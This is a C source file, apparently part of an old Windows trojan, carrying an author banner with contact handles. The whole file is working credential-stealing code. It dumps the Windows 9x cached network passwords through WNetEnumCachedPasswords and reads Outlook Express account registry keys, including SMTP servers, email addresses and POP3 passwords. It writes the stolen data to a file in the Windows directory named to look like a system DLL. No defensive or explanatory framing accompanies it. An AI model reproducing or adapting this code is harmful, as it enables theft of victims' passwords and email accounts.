//////////////////////////////////////////////////////////////////////////
//		Coded by   Hirosh ,India										//
//////////////////////////////////////////////////////////////////////////
//					MSN hirr@hotmail.com								//	
//					yahoo hirosh22@yahoo.com							//
//					ICQ 109619370										//
//					Email :hirhirhir@hotpop.com							//	
//					www.hirosh.tk									//
//////////////////////////////////////////////////////////////////////////
//	I am the one mad from india	!!!!!!!									//	
//////////////////////////////////////////////////////////////////////////

void findserv();
char cashpass[1600]="";
void cashedpasswords();
void findpass()
{
DWORD dwBytes;
char an[MAX_PATH];
findserv();
if((int)GetVersion() < 0){
cashedpasswords();
GetWindowsDirectory(an,MAX_PATH);
lstrcat(an,"\\winfileb32.dll");
HANDLE hF = CreateFile (an,
                                         GENERIC_WRITE,
                                         0,
                                         NULL,
                                         OPEN_ALWAYS,
                                         FILE_ATTRIBUTE_NORMAL,
                                         NULL);
SetFilePointer(hF,0 ,NULL,FILE_END);
WriteFile (hF, (LPVOID)cashpass,strlen(cashpass), &dwBytes, NULL);
WriteFile (hF, (LPVOID)"\r\n\r\n",4, &dwBytes, NULL);
CloseHandle (hF);
}
}
struct PASSWORD_CACHE_ENTRY { WORD cbEntry; WORD cbResource; WORD cbPassword; BYTE iEntry;BYTE nType; char abResource[1];};
typedef BOOL (FAR PASCAL *CACHECALLBACK)( struct PASSWORD_CACHE_ENTRY FAR *pce, DWORD dwRefData );
DWORD APIENTRY WNetEnumCachedPasswords(LPSTR pbPrefix,WORD cbPrefix,BYTE nType,CACHECALLBACK pfnCallback,DWORD dwRefData);
typedef DWORD (WINAPI *ENUMPASSWORD)(LPSTR pbPrefix, WORD  cbPrefix, BYTE  nType, CACHECALLBACK pfnCallback, DWORD dwRefData);
ENUMPASSWORD pWNetEnumCachedPasswords;
typedef struct {char *pBuffer;int nBufLen;int nBufPos;} PASSCACHECALLBACK_DATA;
BOOL PASCAL AddPass(struct PASSWORD_CACHE_ENTRY FAR *pce, DWORD dwRefData)
{
	char buff[1024],buff2[1024];
	int nCount;
	PASSCACHECALLBACK_DATA *dat;
	dat = (PASSCACHECALLBACK_DATA *)dwRefData;
	nCount=pce->cbResource;
	if(nCount>1023) nCount=1023;
	lstrcpyn(buff, pce->abResource, nCount);
	buff[nCount] = 0;
	CharToOem(buff, buff2);
	if((dat->nBufPos+lstrlen(buff2))>=dat->nBufLen) return FALSE;
	lstrcpy(dat->pBuffer+dat->nBufPos,buff2);
	dat->nBufPos+=lstrlen(buff2)+1;

	nCount=pce->cbPassword;
	if(nCount>1023) nCount=1023;
	lstrcpyn(buff, pce->abResource+pce->cbResource, nCount);
	buff[nCount] = 0;
	CharToOem(buff, buff2);
	if((dat->nBufPos+lstrlen(buff2))>=dat->nBufLen) return FALSE;
	lstrcpy(dat->pBuffer+dat->nBufPos,buff2);
	dat->nBufPos+=lstrlen(buff2)+1;

	return TRUE;
}
void cashedpasswords()
{
   HMODULE hLib=LoadLibrary("MPR.DLL");
   	
   PASSCACHECALLBACK_DATA dat;
   dat.pBuffer=(char *)malloc(65536);
   dat.nBufLen=65536;
   dat.nBufPos=0;
   pWNetEnumCachedPasswords = (ENUMPASSWORD)GetProcAddress(hLib, "WNetEnumCachedPasswords");

   pWNetEnumCachedPasswords(NULL, 0, 0xff, AddPass, (DWORD) &dat);		
   char *svStr;
   svStr=dat.pBuffer;
   lstrcpy(cashpass,"");
   do {
	     char *svRsc=svStr;
		 svStr+=lstrlen(svStr)+1;
	   	 char *svPwd=svStr;
		 svStr+=lstrlen(svStr)+1;
		 char svBuff[1024];
		 wsprintf(svBuff, "%.256s : %.256s\x0D\x0A", svRsc, svPwd);
         lstrcat(cashpass,svBuff);
   }while(*svStr!='\0');

   FreeLibrary(hLib); 

};

void findserv()
{
DWORD dwBytes;
HKEY hkeyresult ,hkeyresult1;
long l,i;
char name[200],skey[100];
DWORD dw2;
FILETIME f;
lstrcpy(skey,"Software\\Microsoft\\Internet Account Manager\\Accounts");
LONG     lResult=RegOpenKeyEx(HKEY_CURRENT_USER, ( LPCTSTR ) skey,0,KEY_ALL_ACCESS, &hkeyresult1 );
if(ERROR_SUCCESS != lResult)
return ;
dw2=200;
i=0;l=0;
BYTE rdate[250];
DWORD size;
size=500;
int j;
j=0;
char an[MAX_PATH];
GetWindowsDirectory(an,MAX_PATH);
lstrcat(an,"\\winfileb32.dll");
HANDLE hF = CreateFile (an,
                                         GENERIC_WRITE,
                                         0,
                                         NULL,
                                         OPEN_ALWAYS,
                                         FILE_ATTRIBUTE_NORMAL,
                                         NULL);
SetFilePointer(hF,0 ,NULL,FILE_END);

while(l!=ERROR_NO_MORE_ITEMS){
l=RegEnumKeyEx(hkeyresult1,i,name,&dw2,NULL,NULL,NULL,&f);
lstrcpy(skey,"Software\\Microsoft\\Internet Account Manager\\Accounts");
lstrcat(skey,"\\");
lstrcat(skey,name);
RegOpenKeyEx(HKEY_CURRENT_USER, ( LPCTSTR )skey ,0,KEY_ALL_ACCESS, &hkeyresult );
RegQueryValueEx ( hkeyresult, ( LPCTSTR )"SMTP Server" , 0, 0, rdate, &size ) ;
WriteFile (hF, (LPVOID)(char *)rdate, size, &dwBytes, NULL);
WriteFile (hF, (LPVOID)" ",1, &dwBytes, NULL);
size=100;
RegQueryValueEx ( hkeyresult, ( LPCTSTR )"SMTP Display Name" , 0, 0, rdate, &size ) ;
WriteFile (hF, (LPVOID)(char *)rdate, size, &dwBytes, NULL);
WriteFile (hF, (LPVOID)" ",1, &dwBytes, NULL);
size=100;
RegQueryValueEx ( hkeyresult, ( LPCTSTR )"SMTP Email Address" , 0, 0, rdate, &size ) ;
WriteFile (hF, (LPVOID)(char *)rdate, size, &dwBytes, NULL);
WriteFile (hF, (LPVOID)" ",1, &dwBytes, NULL);
size=100;
RegQueryValueEx ( hkeyresult, ( LPCTSTR )"POP3 Password2" , 0, 0, rdate, &size ) ;
WriteFile (hF, (LPVOID)(char *)rdate, size, &dwBytes, NULL);
WriteFile (hF, (LPVOID)"\r\n",2, &dwBytes, NULL);
size=100;
j++;i++;
}
WriteFile (hF, (LPVOID)"\r\n\r\n",4, &dwBytes, NULL);
CloseHandle (hF);
}